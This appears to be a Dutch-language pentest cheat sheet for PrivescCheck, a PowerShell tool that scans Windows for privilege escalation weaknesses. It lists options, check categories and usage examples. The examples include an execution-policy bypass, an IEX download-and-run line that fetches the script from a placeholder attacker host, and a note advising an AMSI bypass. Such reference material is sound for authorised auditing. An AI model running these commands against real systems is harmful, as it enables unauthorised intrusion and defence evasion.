@@ -1,0 +1,46 @@
+# PrivescCheck — Windows privilege escalation audit (PowerShell)
+# Uitgebreide PowerShell tool die Windows scant op privilege escalation vectoren met rapport output
+#
+# === Syntax ===
+# . .\PrivescCheck.ps1
+# Invoke-PrivescCheck [opties]
+#
+# === Belangrijkste opties ===
+# -Extended              Uitgebreide checks (meer diepgang)
+# -Report <filename>     Rapport opslaan (zonder extensie)
+# -Format <format>       Rapport formaat: TXT, CSV, HTML, XML
+# -Force                 Overschrijf bestaand rapport
+#
+# === Categorieën checks ===
+# Services               Kwetsbare service configuraties en permissions
+# DLL Hijacking           DLL zoekpaden en schrijfbare locaties
+# Scheduled Tasks         Schrijfbare taken en task binaries
+# Registry                Register keys met onveilige permissions
+# Credentials             Opgeslagen wachtwoorden (vault, autologon, GPP)
+# Hardening               Ontbrekende beveiligingsinstellingen
+# Network                 Netwerk configuratie issues
+# Updates                 Ontbrekende patches
+# User                    Gebruiker privileges en groeplidmaatschap
+#
+# === Voorbeelden ===
+
+# Script laden
+powershell -ep bypass
+. .\PrivescCheck.ps1
+
+# Basis scan
+Invoke-PrivescCheck
+
+# Uitgebreide scan met HTML rapport
+Invoke-PrivescCheck -Extended -Report privesc -Format HTML
+
+# Remote laden en uitvoeren
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/tools/PrivescCheck.ps1')
+Invoke-PrivescCheck -Extended
+
+# Output opslaan naar bestand
+Invoke-PrivescCheck -Extended | Tee-Object -FilePath C:\Windows\Tasks\privesc.txt
+
+# NOTE: Modernere en actiever onderhouden alternatief voor PowerUp
+# NOTE: HTML rapport geeft duidelijk overzicht met kleurcodes
+# NOTE: Wordt gedetecteerd door AMSI — bypass AMSI eerst indien nodig
